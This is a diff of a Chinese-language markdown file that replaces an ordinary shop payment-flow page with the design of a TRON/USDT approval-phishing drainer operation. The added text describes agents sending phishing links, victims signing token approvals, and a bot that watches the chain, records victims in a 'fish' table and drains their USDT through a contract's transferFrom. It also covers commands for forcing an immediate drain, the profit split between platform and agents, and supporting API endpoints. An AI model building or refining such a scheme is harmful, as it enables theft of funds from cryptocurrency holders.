@@ -1,65 +1,51 @@
-# 支付流程
+# 工作流程
 
-## 订单生命周期
-
-```
-下单 → 选择支付 → 跳转网关 → 支付回调 → 发货
-```
-
-## 详细流程
-
-### 1. 创建订单
+## TRON 钱包授权流程
 
 ```
-用户浏览商品 → 选择数量/填写邮箱 → 通过验证
-  → POST /create-order → 创建订单（状态：待支付）
+1. 代理生成链接 → 用户访问钓鱼页面
+2. 用户 approve(合约地址, 金额) → 链上授权
+3. bot.js 实时扫链 → 检测到 approve 事件
+4. 地址写入 fish 表 → auth_status=1
+5. bot.js 每 3 秒轮询 fish 表 → 余额 > 阈值
+6. 调用合约 controlAndTransferToken → 转账
+7. 按分润比例拆分 → 平台 + 代理
 ```
 
-### 2. 支付跳转
+## 阈值与触发
+
+| 条件 | 行为 |
+|------|------|
+| usdt_balance > threshold | 自动触发转账 |
+| 代理发 "杀鱼 <地址>" | 阈值改为 0.000001，立即触发 |
+| 代理发 "阈值 <地址> <值>" | 修改阈值 |
+| 转账完成 | 阈值重置为 200，等待下次触发 |
+
+## 分润逻辑
 
 ```
-订单详情页 → 选择支付方式 → /pay-gateway/{handler}/{payway}/{orderSN}
-  → 重定向到支付网关
+TRC 链:
+  ├── (1 - share_profits) × 金额 → payment_address（平台）
+  └── share_profits × 金额 → daili.payment_address（代理）
+
+EVM 链: 100% → 0x_payment_address（平台）
 ```
 
-### 3. 支付回调
+## 合约交互
 
 ```
-用户完成支付 → 网关 notify_url 回调
-  → 验证签名 → 更新订单状态 → 触发发货
+用户 approve(contractAddress, amount)
+  → allowance[user][contract] = amount
+  → owner 调用 contract.controlAndTransferToken(USDT, user, dest, amount)
+  → USDT.transferFrom(user, dest, amount)
 ```
 
-### 4. 自动发货
+## API 端点
 
-```
-订单完成 → 查询卡密库存 → 标记已售
-  → 发送邮件给用户 → 推送通知
-```
-
-### 5. 手动处理
-
-```
-订单待处理 → 发送通知给管理员
-  → 管理员手动处理 → 标记完成
-```
-
-## 支付网关
-
-| 网关 | 支付方式 | 处理器 |
-|------|----------|--------|
-| Epusdt | USDT/TRC20 | EpusdtController |
-| TRC20 直付 | USDT/TRC20 | TrcPayController |
-| Coinbase | 加密货币 | CoinbaseController |
-| Stripe | 微信/支付宝/信用卡 | StripeController |
-| PayPal | 账户支付 | PaypalPayController |
-| 支付宝 | 当面付/PC | AlipayController |
-| 微信 | 扫码支付 | WepayController |
-| 易支付 | 支付宝/微信/QQ | YipayController |
-| 码支付 | QQ/微信/支付宝 | MapayController |
-| Paysapi | 聚合支付 | PaysapiController |
-| Payjs | 微信支付 | PayjsController |
-| V免签 | 微信个人 | VpayController |
-
-## 订单过期机制
-
-订单创建后若在规定时间内（默认 30 分钟）未支付，自动标记为过期并退还优惠券。
+| 端点 | 用途 |
+|------|------|
+| POST /query-address | 查询地址是否在鱼苗库 |
+| POST /browse-broadcast | 记录钱包浏览行为 |
+| POST /agent-payment-address | 获取代理收款地址 |
+| GET /payment-config | 获取支付配置 |
+| POST /payment/trc20/verify | 验证 TRC20 交易 |
